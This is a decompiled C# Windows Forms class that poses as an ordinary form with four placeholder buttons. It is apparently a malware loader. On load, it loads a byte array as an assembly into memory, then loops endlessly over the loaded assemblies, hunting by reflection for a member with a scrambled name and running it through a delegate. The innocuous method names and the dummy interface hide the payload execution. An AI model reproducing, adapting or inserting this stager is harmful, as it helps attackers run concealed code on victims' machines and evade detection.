using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Windows.Forms;

namespace Vzhkt;

public class Form2 : Form
{
	private Delegate GetDelegate;

	private IContainer components = null;

	private Button button4;

	private Button button3;

	private Button button2;

	private Button button1;

	private AppDomain AppDomain { get; set; }

	private byte[] Array { get; set; }

	private event EventHandler Browser;

	public Form2(object o)
	{
		Browser += Form2_Browser;
		InitializeComponent();
		Array = o as byte[];
	}

	private void Form2_Browser(object sender, EventArgs e)
	{
		GetDelegate?.DynamicInvoke();
	}

	private void Form2_Load(object sender, EventArgs e)
	{
		Green();
		AppDomain.Load(Array);
		Yellow();
	}

	private void Green()
	{
		AppDomain = AppDomain.CurrentDomain;
	}

	private void Yellow()
	{
		string baseDirectory = AppDomain.BaseDirectory;
		while (baseDirectory == AppDomain.BaseDirectory)
		{
			Assembly[] assemblies = AppDomain.CurrentDomain.GetAssemblies();
			foreach (Assembly assembly in assemblies)
			{
				Type[] types = assembly.GetTypes();
				foreach (Type type in types)
				{
					MemberInfo[] members = type.GetMembers();
					foreach (MemberInfo memberInfo in members)
					{
						if (memberInfo.Name == "Nmgpdbhjgeicdyiqyowyf")
						{
							GetDelegate = Delegate.CreateDelegate(typeof(Action), (MethodInfo)memberInfo);
							this.Browser?.DynamicInvoke(null, null);
						}
					}
				}
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		button4 = new Button();
		button3 = new Button();
		button2 = new Button();
		button1 = new Button();
		((Control)this).SuspendLayout();
		((Control)button4).set_Location(new Point(430, 252));
		((Control)button4).set_Name("button4");
		((Control)button4).set_Size(new Size(214, 110));
		((Control)button4).set_TabIndex(7);
		((Control)button4).set_Text("button4");
		((ButtonBase)button4).set_UseVisualStyleBackColor(true);
		((Control)button3).set_Location(new Point(204, 252));
		((Control)button3).set_Name("button3");
		((Control)button3).set_Size(new Size(214, 110));
		((Control)button3).set_TabIndex(6);
		((Control)button3).set_Text("button3");
		((ButtonBase)button3).set_UseVisualStyleBackColor(true);
		((Control)button2).set_Location(new Point(430, 117));
		((Control)button2).set_Name("button2");
		((Control)button2).set_Size(new Size(214, 110));
		((Control)button2).set_TabIndex(5);
		((Control)button2).set_Text("button2");
		((ButtonBase)button2).set_UseVisualStyleBackColor(true);
		((Control)button1).set_Location(new Point(204, 117));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(214, 110));
		((Control)button1).set_TabIndex(4);
		((Control)button1).set_Text("button1");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(11f, 24f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(800, 450));
		((Control)this).get_Controls().Add((Control)(object)button4);
		((Control)this).get_Controls().Add((Control)(object)button3);
		((Control)this).get_Controls().Add((Control)(object)button2);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).set_Name("Form2");
		((Control)this).set_Text("Form2");
		((Form)this).add_Load((EventHandler)Form2_Load);
		((Control)this).ResumeLayout(false);
	}
}
